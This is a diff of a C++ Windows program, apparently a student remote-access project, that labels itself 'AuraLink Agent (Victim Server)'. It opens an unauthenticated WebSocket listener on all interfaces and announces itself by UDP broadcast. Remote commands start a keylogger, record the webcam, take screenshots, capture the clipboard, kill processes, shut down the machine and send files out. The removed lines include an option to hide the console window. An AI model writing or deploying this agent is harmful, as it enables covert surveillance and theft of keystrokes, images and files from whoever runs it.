@@ -1,27 +1,37 @@
-﻿// --- CAU HINH WINDOWS ---
+﻿// =============================================================
+// AURALINK SERVER AGENT
+// =============================================================
+
+// --- 1. CẤU HÌNH & THƯ VIỆN HỆ THỐNG ---
 #ifndef _WIN32_WINNT
 #define _WIN32_WINNT 0x0A00 
 #endif
 
-#include <boost/beast/core.hpp>
-#include <boost/beast/websocket.hpp>
-#include <boost/asio/ip/tcp.hpp>
-#include <boost/asio/ip/udp.hpp> 
-#include <boost/asio/strand.hpp>
-#include <cstdlib>      
+// Thư viện C++ chuẩn
 #include <iostream>
 #include <string>
 #include <thread>
 #include <memory>
 #include <vector>
 #include <fstream>
+#include <cstdlib>      
+#include <iomanip>
+#include <chrono>
+#include <atomic> 
+#include <sstream>
+
+// Thư viện Boost (Mạng & WebSocket)
+#include <boost/beast/core.hpp>
+#include <boost/beast/websocket.hpp>
+#include <boost/asio/ip/tcp.hpp>
+#include <boost/asio/ip/udp.hpp> 
+#include <boost/asio/strand.hpp>
+
+// Thư viện Windows API
 #include <windows.h>   
 #include <iphlpapi.h>
-#include <atomic> 
-#include <iomanip>
-#include <chrono> 
 
-// Cac module chuc nang 
+// --- 2. CÁC MODULE CHỨC NĂNG (CUSTOM HEADERS) ---
 #include "Process.h"
 #include "Keylogger.h"
 #include "Webcam.h"
@@ -31,27 +41,40 @@
 #include "Clipboard.h"
 #include "FileTransfer.h"
 
-// Link thu vien Windows
+// --- 3. LIÊN KẾT THƯ VIỆN (LINKER) ---
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "user32.lib") 
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "psapi.lib")
 
+// --- 4. NAMESPACE & BIẾN TOÀN CỤC ---
 namespace beast = boost::beast;
 namespace http = beast::http;
 namespace websocket = beast::websocket;
 namespace net = boost::asio;
 using tcp = boost::asio::ip::tcp;
-using udp = boost::asio::ip::udp; // [MỚI]
+using udp = boost::asio::ip::udp;
+
+// Biến quản lý luồng quay Webcam
+std::thread g_webcamThread;
+
+// Khai báo hàm Shutdown/Restart 
+void DoShutdown();
+void DoRestart();
+
+// Hàm báo lỗi cơ bản
+void fail(beast::error_code ec, char const* what) {
+    std::cerr << what << ": " << ec.message() << "\n";
+}
 
 // =============================================================
-// PHAN 1: CAC HAM HO TRO (LIVE STATUS & RESOURCES)
+// PHẦN 5: CÁC HÀM TIỆN ÍCH (HELPER FUNCTIONS)
 // =============================================================
 
+// Mã hóa Base64 (Dùng để gửi ảnh/video qua socket)
 static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
-// Hàm mã hóa Base64
 std::string base64_encode(const std::vector<char>& data) {
     std::string ret;
     int i = 0, j = 0;
@@ -81,7 +104,8 @@ std::string base64_encode(const std::vector<char>& data) {
     return ret;
 }
 
-// Các hàm lấy thông tin hệ thống
+// --- Các hàm lấy thông tin hệ thống (System Info) ---
+
 std::string GetComputerNameStr() {
     char buffer[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD size = sizeof(buffer);
@@ -92,29 +116,19 @@ std::string GetComputerNameStr() {
 std::string GetOSVersionStr() {
     std::string osName = "Unknown Windows";
     HKEY hKey;
-    // Mở khóa Registry chứa thông tin Windows
     if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-
-        // 1. Lấy tên sản phẩm (ProductName) - Thường trả về "Windows 10 Pro" kể cả trên Win 11
         char productName[255] = { 0 };
         DWORD dataSize = sizeof(productName);
         if (RegQueryValueExA(hKey, "ProductName", nullptr, nullptr, (LPBYTE)productName, &dataSize) == ERROR_SUCCESS) {
             osName = std::string(productName);
         }
-
-        // 2. [FIX] Lấy số Build (CurrentBuild) để phân biệt Win 10 và 11
         char buildStr[32] = { 0 };
         DWORD buildSize = sizeof(buildStr);
         if (RegQueryValueExA(hKey, "CurrentBuild", nullptr, nullptr, (LPBYTE)buildStr, &buildSize) == ERROR_SUCCESS) {
             int buildNumber = std::atoi(buildStr);
-
-            // Windows 11 bắt đầu từ Build 22000
-            if (buildNumber >= 22000) {
-                // Tìm chữ "Windows 10" trong tên và sửa thành "Windows 11"
+            if (buildNumber >= 22000) { 
                 size_t pos = osName.find("Windows 10");
-                if (pos != std::string::npos) {
-                    osName.replace(pos, 10, "Windows 11");
-                }
+                if (pos != std::string::npos) osName.replace(pos, 10, "Windows 11");
             }
         }
         RegCloseKey(hKey);
@@ -200,45 +214,35 @@ std::string GetBatteryStatus() {
     return "Unknown";
 }
 
-void DoShutdown();
-void DoRestart();
-std::thread g_webcamThread;
-void fail(beast::error_code ec, char const* what) { std::cerr << what << ": " << ec.message() << "\n"; }
-
 // =============================================================
-// AUTO DISCOVERY BROADCASTER (UDP)
+// PHẦN 6: AUTO DISCOVERY (UDP BROADCASTER)
 // =============================================================
+// Luồng này chạy ngầm, liên tục gửi tin hiệu "Tôi ở đây" cho Server Registry
 
-// Hàm này chạy trên thread riêng, liên tục gửi tín hiệu "Tôi ở đây"
 void UDP_Broadcaster_Thread(int targetPort, int myWsPort) {
     try {
         net::io_context ioc;
         udp::socket socket(ioc);
         socket.open(udp::v4());
-        socket.set_option(udp::socket::broadcast(true)); // Cho phép gửi Broadcast
+        socket.set_option(udp::socket::broadcast(true)); // Cho phép Broadcast
 
-        // Địa chỉ broadcast toàn mạng (255.255.255.255)
         udp::endpoint broadcast_endpoint(net::ip::address_v4::broadcast(), targetPort);
 
         std::string myName = GetComputerNameStr();
         std::string myOS = GetOSVersionStr();
-        // ID đơn giản là tên máy (hoặc bạn có thể dùng MAC address nếu muốn duy nhất hơn)
-        std::string myID = "ID-" + myName;
+        std::string myID = "ID-" + myName; // Tạo ID đơn giản
 
-        std::cout << "[UDP] Started broadcasting discovery signal to port " << targetPort << "...\n";
+        std::cout << "[UDP] Broadcasting discovery signal to port " << targetPort << "...\n";
 
         while (true) {
-            // Cấu trúc gói tin: REGISTER|ID|Name|OS|Port
+            // Định dạng: REGISTER|ID|Name|OS|Port
             std::string msg = "REGISTER|" + myID + "|" + myName + "|" + myOS + "|" + std::to_string(myWsPort);
 
             boost::system::error_code ec;
             socket.send_to(net::buffer(msg), broadcast_endpoint, 0, ec);
 
-            if (ec) {
-                std::cerr << "[UDP Error] Broadcast failed: " << ec.message() << "\n";
-            }
+            if (ec) std::cerr << "[UDP Lỗi] Broadcast failed: " << ec.message() << "\n";
 
-            // Gửi mỗi 5 giây một lần
             std::this_thread::sleep_for(std::chrono::seconds(5));
         }
     }
@@ -248,88 +252,66 @@ void UDP_Broadcaster_Thread(int targetPort, int myWsPort) {
 }
 
 // =============================================================
-// PHAN 2: XU LY KET NOI (SESSION) 
+// PHẦN 7: XỬ LÝ KẾT NỐI WEBSOCKET (SESSION)
 // =============================================================
 
 class session : public std::enable_shared_from_this<session> {
     websocket::stream<beast::tcp_stream> ws_;
     beast::flat_buffer buffer_;
 
-    // [FIX] Thêm hàng đợi để lưu các tin nhắn chưa gửi kịp
     std::vector<std::shared_ptr<std::string>> queue_;
 
 public:
     explicit session(tcp::socket&& socket) : ws_(std::move(socket)) {}
 
     void run() {
-        // Cấu hình Timeout
         ws_.set_option(websocket::stream_base::timeout::suggested(beast::role_type::server));
         ws_.async_accept(beast::bind_front_handler(&session::on_accept, shared_from_this()));
     }
 
     void on_accept(beast::error_code ec) {
         if (ec) return fail(ec, "Accept Error");
-        do_read();
+        do_read(); 
     }
 
-    // --- HÀM SEND ĐÃ ĐƯỢC NÂNG CẤP ---
+    // --- HÀM GỬI DỮ LIỆU (THREAD-SAFE) ---
     void send(std::string msg) {
         auto self = shared_from_this();
         auto msg_ptr = std::make_shared<std::string>(std::move(msg));
 
-        // Đẩy việc xử lý vào luồng chính (Executor)
         net::post(ws_.get_executor(), [self, msg_ptr]() {
             if (!self->ws_.is_open()) return;
-
-            // 1. Thêm tin nhắn vào hàng đợi
             self->queue_.push_back(msg_ptr);
-
-            // 2. Nếu hàng đợi có nhiều hơn 1 tin nhắn, nghĩa là đang có 
-            // một tin nhắn khác đang được gửi (async_write chưa xong).
-            // Ta chỉ cần return, tin nhắn này sẽ được xử lý sau.
-            if (self->queue_.size() > 1) {
-                return;
-            }
-
-            // 3. Nếu hàng đợi chỉ có mình nó, bắt đầu gửi ngay
+            if (self->queue_.size() > 1) return;
             self->do_write();
             });
     }
 
-    // [FIX] Hàm thực hiện việc ghi dữ liệu (được gọi nội bộ)
     void do_write() {
         if (queue_.empty()) return;
-
-        // Lấy tin nhắn đầu hàng đợi ra để gửi
         auto const& msg_ptr = queue_.front();
-
         ws_.text(true);
         ws_.async_write(net::buffer(*msg_ptr),
             beast::bind_front_handler(&session::on_write, shared_from_this()));
     }
 
+    void on_write(beast::error_code ec, std::size_t bytes_transferred) {
+        boost::ignore_unused(bytes_transferred);
+        if (ec) {
+            std::cerr << "Write Error: " << ec.message() << "\n";
+            queue_.clear();
+            return;
+        }
+        queue_.erase(queue_.begin());
+        if (!queue_.empty()) do_write();
+    }
+
+    // --- HÀM ĐỌC DỮ LIỆU ---
     void do_read() {
         ws_.async_read(buffer_, beast::bind_front_handler(&session::on_read, shared_from_this()));
     }
 
-    void on_write(beast::error_code ec, std::size_t bytes_transferred) {
-        boost::ignore_unused(bytes_transferred);
-
-        if (ec) {
-            std::cerr << "Write Error: " << ec.message() << "\n";
-            queue_.clear(); // Nếu lỗi thì xóa hết hàng đợi
-            return;
-        }
-
-        // 1. Xóa tin nhắn đã gửi xong khỏi hàng đợi
-        queue_.erase(queue_.begin());
-
-        // 2. Nếu còn tin nhắn trong hàng đợi, tiếp tục gửi tin tiếp theo
-        if (!queue_.empty()) {
-            do_write();
-        }
-    }
-
+    // --- XỬ LÝ LỆNH TỪ CLIENT (CORE LOGIC) ---
     void on_read(beast::error_code ec, std::size_t bytes_transferred) {
         boost::ignore_unused(bytes_transferred);
         if (ec == websocket::error::closed) return;
@@ -338,18 +320,15 @@ public:
         if (ws_.got_text()) {
             std::string command = beast::buffers_to_string(buffer_.data());
 
-            // Xử lý lệnh trong block try-catch để server không bao giờ bị crash
+            static Keylogger myKeylogger;
+            static Process myProcessModule;
+            static Application myAppModule;
+            static Clipboard myClipboard;
+            static TextToSpeech myTTS;
+
             try {
-                // Khai báo các module static để dùng chung
-                static Keylogger myKeylogger;
-                static Process myProcessModule;
-                static Application myAppModule;
-                static Clipboard myClipboard;
-
-                // --- XỬ LÝ LỆNH ---
-
+                // 1. Hệ thống & Tài nguyên
                 if (command == "get-sys-info") {
-                    // Lấy thông tin hệ thống
                     std::string sysInfo = "sys-info " + GetComputerNameStr() + "|" +
                         GetOSVersionStr() + "|" + GetRamFree() + "|" +
                         GetBatteryStatus() + "|" + GetDiskFree() + "|" +
@@ -360,6 +339,7 @@ public:
                 else if (command == "ping") {
                     send("pong");
                 }
+                // 2. Power
                 else if (command == "shutdown") {
                     send("Server: OK, shutting down...");
                     DoShutdown();
@@ -368,6 +348,7 @@ public:
                     send("Server: OK, restarting...");
                     DoRestart();
                 }
+                // 3. Webcam
                 else if (command == "capture") {
                     if (g_webcamThread.joinable()) {
                         send("Server: Busy recording...");
@@ -375,12 +356,10 @@ public:
                     else {
                         send("Server: Started recording...");
                         auto self = shared_from_this();
-                        // Chạy luồng riêng để quay phim
                         g_webcamThread = std::thread([self]() {
-                            std::vector<char> videoData = CaptureWebcam(10); // Quay 10 giây
+                            std::vector<char> videoData = CaptureWebcam(10);
                             if (!videoData.empty()) {
                                 std::string encoded = base64_encode(videoData);
-                                // Gọi hàm send() mới -> Nó sẽ tự dùng net::post để an toàn
                                 self->send("file " + encoded);
                             }
                             else {
@@ -390,6 +369,7 @@ public:
                         g_webcamThread.detach();
                     }
                 }
+                // 4. Screenshot
                 else if (command == "screenshot") {
                     int width = GetSystemMetrics(SM_CXSCREEN);
                     int height = GetSystemMetrics(SM_CYSCREEN);
@@ -403,6 +383,7 @@ public:
                         send("screenshot " + std::to_string(width) + " " + std::to_string(height) + " " + encoded);
                     }
                 }
+                // 5. Keylogger
                 else if (command == "start-keylog") {
                     myKeylogger.StartKeyLogging();
                     send("Server: Keylogger started...");
@@ -415,6 +396,7 @@ public:
                     std::string logs = myKeylogger.GetLoggedKeys();
                     send(logs);
                 }
+                // 6. Quản lý Tiến trình (Process)
                 else if (command == "ps") {
                     std::string list = myProcessModule.ListProcesses();
                     send(list);
@@ -429,6 +411,7 @@ public:
                     std::string result = myProcessModule.StopProcess(target);
                     send("Server: " + result);
                 }
+                // 7. Quản lý Ứng dụng (App)
                 else if (command == "list-app") {
                     myAppModule.LoadInstalledApps();
                     auto apps = myAppModule.ListApplicationsWithStatus();
@@ -452,12 +435,13 @@ public:
                     bool ok = myAppModule.StopApplication(input);
                     send(ok ? "Server: Stopped " + input : "Server: Failed stop " + input);
                 }
+                // 8. Text To Speech
                 else if (command.rfind("tts ", 0) == 0) {
                     std::string textToSpeak = command.substr(4);
-                    static TextToSpeech myTTS;
                     myTTS.Speak(textToSpeak);
                     send("Server: OK, speaking...");
                 }
+                // 9. Clipboard
                 else if (command == "start-clip") {
                     myClipboard.StartMonitoring();
                     send("Server: Clipboard Monitor STARTED...");
@@ -471,9 +455,9 @@ public:
                     if (logs.empty()) logs = "[No clipboard data]";
                     send("CLIPBOARD_DATA:\n" + logs);
                 }
+                // 10. File Manager (Download & List)
                 else if (command.rfind("download-file ", 0) == 0) {
                     std::string filepath = command.substr(14);
-                    // Trim spaces
                     filepath.erase(0, filepath.find_first_not_of(" \n\r\t"));
                     filepath.erase(filepath.find_last_not_of(" \n\r\t") + 1);
                     std::string response = FileTransfer::HandleDownloadRequest(filepath);
@@ -491,20 +475,25 @@ public:
             }
             catch (const std::exception& e) {
                 std::cerr << "Command Processing Error: " << e.what() << "\n";
-                // Không gửi lại lỗi để tránh vòng lặp, chỉ log ra console server
             }
         }
 
+        // Xóa buffer và tiếp tục đọc
         buffer_.consume(buffer_.size());
         do_read();
     }
 };
 
+// =============================================================
+// PHẦN 8: LISTENER (CHẤP NHẬN KẾT NỐI MỚI)
+// =============================================================
+
 class listener : public std::enable_shared_from_this<listener> {
     net::io_context& ioc_;
     tcp::acceptor acceptor_;
 public:
-    listener(net::io_context& ioc, tcp::endpoint endpoint) : ioc_(ioc), acceptor_(ioc) {
+    listener(net::io_context& ioc, tcp::endpoint endpoint)
+        : ioc_(ioc), acceptor_(ioc) {
         beast::error_code ec;
         acceptor_.open(endpoint.protocol(), ec);
         if (ec) { fail(ec, "Open Error"); return; }
@@ -516,8 +505,13 @@ public:
         if (ec) { fail(ec, "Listen Error"); return; }
     }
     void run() { do_accept(); }
+
 private:
-    void do_accept() { acceptor_.async_accept(net::make_strand(ioc_), beast::bind_front_handler(&listener::on_accept, shared_from_this())); }
+    void do_accept() {
+        acceptor_.async_accept(net::make_strand(ioc_),
+            beast::bind_front_handler(&listener::on_accept, shared_from_this()));
+    }
+
     void on_accept(beast::error_code ec, tcp::socket socket) {
         if (ec) fail(ec, "Accept Error");
         else std::make_shared<session>(std::move(socket))->run();
@@ -526,31 +520,27 @@ private:
 };
 
 // =============================================================
-// MAIN FUNCTION
+// PHẦN 9: HÀM MAIN (ENTRY POINT)
 // =============================================================
 
 int main() {
-    // Ẩn cửa sổ Console nếu muốn chạy ngầm hoàn toàn (bỏ comment nếu cần)
-    // ShowWindow(GetConsoleWindow(), SW_HIDE);
-
-    SetProcessDPIAware();
-
     auto const address = net::ip::make_address("0.0.0.0");
-    unsigned short ws_port = 8080;  // Cổng WebSocket của Victim
-    unsigned short udp_port = 8081; // Cổng UDP của Registry Server (để gửi tới)
+    unsigned short ws_port = 8080;  // Cổng WebSocket nhận lệnh
+    unsigned short udp_port = 8081; // Cổng UDP gửi tín hiệu Discovery
     int threads = 1;
 
-    std::cout << "Starting AuraLink Agent (Victim)...\n";
-    std::cout << "WS Listening on port: " << ws_port << "\n";
-    std::cout << "Discovery Broadcasting to UDP port: " << udp_port << "\n";
-    std::cout << "----------------------------------\n";
+    std::cout << "======================================\n";
+    std::cout << "   AURALINK AGENT (VICTIM SERVER)     \n";
+    std::cout << "======================================\n";
+    std::cout << "[INFO] WS Listening on port: " << ws_port << "\n";
+    std::cout << "[INFO] Discovery Broadcasting: " << udp_port << "\n";
+    std::cout << "--------------------------------------\n";
 
     // 1. Khởi động luồng UDP Broadcaster (Chạy ngầm)
-    // Gửi tín hiệu đến Registry Server (port 8081) báo rằng "Tôi đang chạy ở cổng 8080"
     std::thread broadcaster(UDP_Broadcaster_Thread, udp_port, ws_port);
     broadcaster.detach();
 
-    // 2. Khởi động WebSocket Server (Chờ kết nối trực tiếp từ Web Client)
+    // 2. Khởi động WebSocket Server (Main Loop)
     net::io_context ioc{ threads };
     std::make_shared<listener>(ioc, tcp::endpoint{ address, ws_port })->run();
     ioc.run();
